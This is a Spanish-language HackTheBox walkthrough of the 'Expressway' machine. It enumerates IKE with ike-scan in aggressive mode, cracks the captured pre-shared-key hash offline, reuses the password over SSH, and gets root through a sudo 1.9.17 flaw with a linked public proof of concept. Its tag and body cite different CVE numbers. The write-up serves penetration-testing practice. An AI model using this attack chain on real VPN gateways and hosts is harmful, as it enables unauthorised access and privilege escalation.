
Propiedades:
- OS: Linux
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #isakmp #sudo #CVE-2025-32462

![](assets/Pasted%20image%2020251209231518.png)
## Reconocimiento

No pude sacar capturas de la fase temprana de reconocimiento, pero lo que descubrimos fue el puerto 500 `isakmp` y el 22 `SSH` por lo cual procedimos a realizar un escaneo mas exhaustivo:

```bash
> nmap -sU -p 500,22 -sV -sC --source-port 53 -vvv -n -sS --min-rate 5000 -oN udp-ports 10.10.11.87
Nmap scan report for 10.10.11.87
Host is up, received timestamp-reply ttl 63 (0.11s latency).
Scanned at 2025-12-09 11:42:54 CST for 128s

PORT    STATE  SERVICE REASON              VERSION
22/tcp  open   ssh     syn-ack ttl 63      OpenSSH 10.0p2 Debian 8 (protocol 2.0)
500/tcp closed isakmp  reset ttl 63
22/udp  closed ssh     port-unreach ttl 63
500/udp open   isakmp? udp-response ttl 63
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Puerto 22 SSH: OpenSSH 10.0p2 Debian 8 (protocol 2.0)
- Puerto 500 Isakmp
## Explotación

Lo primero que hice al ver que estábamos frente a un `Ipsec` fue tratar de enumerarlo con `ike-scan`.

- El solo hecho de que `ike-scan` haya funcionado nos dice que estamos contra un `IKEv1`

```bash
> sudo ike-scan -M 10.10.11.87
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87	Main Mode Handshake returned
	HDR=(CKY-R=4e2a07237593c167)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
```

Ahora podemos tratar de interactuar pero en modo agresivo para tratar de conseguir mas informacion.

- _-A_ Agressive Mode
```bash
> sudo ike-scan -A -M 10.10.11.87
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87	Aggressive Mode Handshake returned
	HDR=(CKY-R=a4e9b43c51cba192)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	KeyExchange(128 bytes)
	Nonce(32 bytes)
	ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
	Hash(20 bytes)

Ending ike-scan 1.9.5: 1 hosts scanned in 0.117 seconds (8.54 hosts/sec).  1 returned handshake; 0 returned notif
```

- El hallazgo clave fue el id: `ike@expressway.htb`
- También podemos ver que utiliza SHA1 y Auth=PSK (Pre Shared Key)

Ahora ya tenemos toda la informacion para tratar de sacar el hash derivado de la `PSK`. La PSK no es mas que una clave que el servidor y cliente conocen para similar una contraseña.

- _-n_ para establecer nuestro el id encontrado

```bash
> sudo ike-scan -M -A -n ike@expressway.htb --pskcrack=hash1.txt 10.10.11.87
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87	Aggressive Mode Handshake returned
	HDR=(CKY-R=e1d65d53e1d47353)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	KeyExchange(128 bytes)
	Nonce(32 bytes)
	ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
	Hash(20 bytes)

Ending ike-scan 1.9.5: 1 hosts scanned in 0.666 seconds (1.50 hosts/sec).  1 returned handshake; 0 returned notify
```

Obtenemos el hash:

- Este hash tiene internamente la `PSK`

```bash
> cat hash1.txt
a392f15bd91cd96670398e689c8ace5a38eabfad001842f8fe4f4f0b74a888bc5a33cd3d92057b3357d79dcfab5b2067d5edc4a78efd80a325d974696ecafabda62aab0b04d3b9b72127a507a23a30456102000ee8a1599e15d34f044cbfddff3603bfc744b9314948cf6f6dac22e5f88fdc63a7867e33701c0301b8b9bf58ce:321e57db506952ef20ff00e8dc9f5fe20ad5b0672c3cd9d8076f5f8ddd448f550941cc653ffd6a2919e4f839a8ee44485b181e6cd1fc26cc874f60e2ca9af89e75228147e594290f59f9a87b98d5ffc934854d403263e7bd6f592406c13f991fd7e536d3f957b54a01acfc61e9ebb62d2004317d97cb67d733ad45a0660bef1e:e1d65d53e1d47353:81a2d95c0bbf77de:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:7fdf850872cd1420ca50ec5669c973012d51b027:8a98bfd277dd01a3ea87b60b030a193d4195532f70a0978c5f4b2a9cebcf5014:01f4c85cec7933b1d25eb5cce5a37d2b0f7f6ba6
```

Ahora nosotros podemos crackear la `PSK`  por fuera utilizando `psk-crack` y  el hash que obtuvimos.

```bash
> psk-crack -d /usr/share/wordlists/rockyou.txt hash1.txt 
Starting psk-crack [ike-scan 1.9.5] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 01f4c85cec7933b1d25eb5cce5a37d2b0f7f6ba6
Ending psk-crack: 8045040 iterations in 5.337 seconds (1507361.77 iterations/sec)
```

- Encontramos la credencial: freakingrockstarontheroad

Ahora podemos tratar de reutilizar las credenciales en el `SSH` utilizando como usuario `ike`, que fue el id que encontramos anteriormente.

- ike:freakingrockstarontheroad

```bash
> ssh ike@<IP>
---------------
ike@expressway:/tmp$ whoami
ike
ike@expressway:/tmp$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```


**Recurso Extra par IPsec: [500/udp - Pentesting IPsec/IKE VPN](https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting)**
## Escalada de Privilegios

Dentro del sistema realizamos nuestra numeración de binarios con privilegios de SUDO o con el bit SUID activado.

- No tenemos exito

```bash
ike@expressway:/tmp$ sudo -l 
Password: 
Sorry, user ike may not run sudo on expressway. 
--------------------------------------------------
# Ningun binario nos sirve
ike@expressway:/tmp$ find / -perm -4000 2>/dev/null
/usr/sbin/exim4
/usr/local/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/sudo
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
```

Al no tener exito procedemos a ver que version de `sudo` se esta utilizando.

```bash
ike@expressway:/tmp$ sudo --version
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.1
```

- Version de sudo es 1.9.17

Tras una busqueda por internet nos topamos que esta version de `sudo` es vulnerable al 1. [CVE-2025-32463](https://github.com/nflatrea/CVE-2025-32463/tree/main). Por lo cual ahora podemos buscar por PoC.

Nos encontramos con este exploit [bipboop.sh](https://github.com/nflatrea/CVE-2025-32463/blob/main/bipboop.sh). Por lo cual ahora podemos bajarlo en nuestra maquina y ejecutarlo:

```bash
ike@expressway:/tmp$ nano bipboop.sh
ike@expressway:/tmp$ chmod +x bipboop.sh
ike@expressway:/tmp$ ./bipboop.sh
Bip boop ! You now root !
```

Somos root:

```bash
root@expressway:/# whoami
root
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike
```

***PWNED***
![](assets/Pasted%20image%2020251209124751.png)